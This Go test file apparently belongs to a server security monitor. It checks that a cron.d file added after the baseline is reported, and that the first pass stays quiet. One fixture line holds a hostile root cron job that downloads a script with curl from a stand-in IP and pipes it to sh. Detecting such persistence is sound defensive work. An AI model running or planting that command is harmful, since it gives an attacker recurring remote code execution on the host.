package checks

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/config"
)

// crond_change only compared hashes of files it had already seen, so a
// file dropped into /etc/cron.d after the baseline was recorded silently
// and never reported. A completed baseline now turns an unknown file into
// a finding.
func TestCheckCrontabsReportsNewCronDFileAfterBaseline(t *testing.T) {
	store := newCrontabTestStore(t)
	store.SetRaw(cronDBaselineKey, "1")
	now := time.Now()
	dropper := "/etc/cron.d/dropper"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/etc/cron.d/*" {
				return []string{dropper}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{dropper: now.Add(-time.Minute)}),
		readFile: func(name string) ([]byte, error) {
			if name == dropper {
				return []byte("* * * * * root curl -s http://203.0.113.5/x | sh\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckCrontabs(context.Background(), &config.Config{}, store)
	found := false
	for _, f := range findings {
		if f.Check == "crond_change" && f.Message == "Cron.d file added: "+dropper {
			found = true
			if !strings.Contains(f.Details, "203.0.113.5") {
				t.Fatalf("details should quote the new job: %q", f.Details)
			}
		}
	}
	if !found {
		t.Fatalf("new cron.d file not reported: %+v", findings)
	}
}

// The first complete pass records the baseline and stays quiet; the marker
// is what later runs use to tell backlog from a genuinely new file.
func TestCheckCrontabsFirstPassRecordsCronDBaselineQuietly(t *testing.T) {
	store := newCrontabTestStore(t)
	now := time.Now()
	existing := "/etc/cron.d/backup"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			if pattern == "/etc/cron.d/*" {
				return []string{existing}, nil
			}
			return nil, nil
		},
		stat: mtimesByPath(map[string]time.Time{existing: now.Add(-48 * time.Hour)}),
		readFile: func(name string) ([]byte, error) {
			if name == existing {
				return []byte("0 3 * * * root /usr/local/bin/backup\n"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckCrontabs(context.Background(), &config.Config{}, store)
	for _, f := range findings {
		if f.Check == "crond_change" {
			t.Fatalf("first pass must not report pre-existing files: %+v", f)
		}
	}
	if _, ok := store.GetRaw(cronDBaselineKey); !ok {
		t.Fatal("baseline marker not recorded after a complete pass")
	}
}
